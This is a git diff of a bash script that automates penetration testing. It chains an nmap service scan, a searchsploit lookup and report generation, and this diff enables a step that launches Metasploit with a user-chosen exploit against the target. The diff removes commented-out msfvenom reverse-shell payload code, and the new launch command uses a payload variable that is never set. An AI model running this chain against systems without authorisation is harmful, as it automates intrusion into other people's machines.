@@ -39,7 +39,7 @@ nmap_scan() {
     echo -e "\e[1;34mStarting Nmap scan...\e[0m"
     read -p "Enter target IP or domain: " target
     scan_type=(-sV -T4)
-    echo "${scan_type[@]}"
+    echo "Scan type: ${scan_type[@]}"
    # Checks if target and scan type are empty
    if [ -z "$target" ] || [ ${#scan_type[@]} -eq 0 ]; then                  
      echo -e "\e[1;31mError: Target and scan type cannot be empty.\e[0m"
@@ -53,7 +53,7 @@ nmap_scan() {
     # Run nmap with the provided target and scan type
     nmap "${scan_type[@]}" "$target" -oX "$results_dir/nmap_scan_$target.xml"
     echo -e "\e[1;32mNmap scan completed. Results saved to $results_dir/nmap_scan_$target.xml.\e[0m"
-
+    read -p ""
     echo -e "\e[1;34mParsing Nmap XML results...\e[0m"
     # Checks if nmap_scan_$target.xml exists
     if [ ! -f "$results_dir/nmap_scan_$target.xml" ]; then
@@ -70,11 +70,12 @@ nmap_scan() {
     #searches through the nmap file
     echo -e "\e[1;34mSearching for exploits using SearchSploit...\e[0m"
 
-    searchsploit --nmap "$results_dir/nmap_scan_$target.xml" > "$results_dir/exploits_$target.txt"
+    searchsploit --nmap "$results_dir/nmap_scan_$target.xml" 2> /dev/null > "$results_dir/exploits_$target.txt"
     echo -e "\e[1;32mExploits saved to exploits_$target.txt.\e[0m"
     #less "$results_dir/exploits_$target.txt"
     generate_report
 }
+
 generate_report() {
     echo -e "\e[1;34mGenerating report...\e[0m"
     report_file="$results_dir/report_$target.txt"
@@ -87,42 +88,24 @@ generate_report() {
         cat "$results_dir/exploits_$target.txt"
     } > "$report_file"
     echo -e "\e[1;32mReport generated: $report_file\e[0m"
+
+    
 }
-#msfconsole_options() {
-#    echo -e "\e[1;34mSetting up Metasploit options...\e[0m"
-#    read -p "Enter local port (LPORT): " lport
-#    read -p "Enter local IP (LHOST): " lhost
-#    read -p "Enter exploit: " exploit
-#    # Validate inputs
-#    if [ -z "$exploit" ] || [ -z "$lport" ] || [ -z "$target" ]; then
-#        echo -e "\e[1;31mError: Exploit, LPORT, and LHOST cannot be empty.\e[0m"``
-#        return 1
-#    fi
-#}
+msfconsole_options() {
+    echo -e "\e[1;34mSetting up Metasploit options...\e[0m"
+    read -p "Enter exploit: " exploit
+    # Validate inputs
+    if [ -z "$exploit" ]; then
+        echo -e "\e[1;31mError: Exploit, and LPORT cannot be empty.\e[0m"``
+        return 1
+    fi
+    execute_msfconsole
+}
 
-#execute_msfconsole() {
-#    echo -e "\e[1;34mLaunching Metasploit Framework...\e[0m"
-#    msfconsole -q -x "use $exploit; set PAYLOAD $payload; set LPORT $lport; set RHOST $target; set LHOST $lhost; run"
-#} 
-
-#execute_msfvenom() {
-#    echo -e "\e[1;34mCreating payload with msfvenom...\e[0m"
-#    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f elf > shell-x86.elf
-#    echo -e "\e[1;32mPayload created: shell-x86.elf\e[0m"
-#    execute_msfconsole
-#}
-
-#set_payload() {
-#    echo -e "do you want to use msfvenom to create a payload? (y/n)"
-#    read -r create_payload
-#    if [[ "$create_payload" == "y" || "$create_payload" == "Y" ]]; then
-#        read -p "Enter the msfvenom payload you want to use: " payload
-#        execute_msfvenom
-#    else
-#        read -p "Enter the msfconsole payload you want to use: " payload
-#        execute_msfconsole
-#    fi
-#}
+execute_msfconsole() {
+    echo -e "\e[1;34mLaunching Metasploit Framework...\e[0m"
+    msfconsole -q -x "use $exploit; set PAYLOAD $payload; set RHOST $target; run"
+} 
 
 
 
@@ -130,10 +113,7 @@ generate_report() {
 Main(){
     check_dependencies
     nmap_scan
+    msfconsole_options
 }
 
 Main
-
-#msfconsole_options
-
-#set_payload
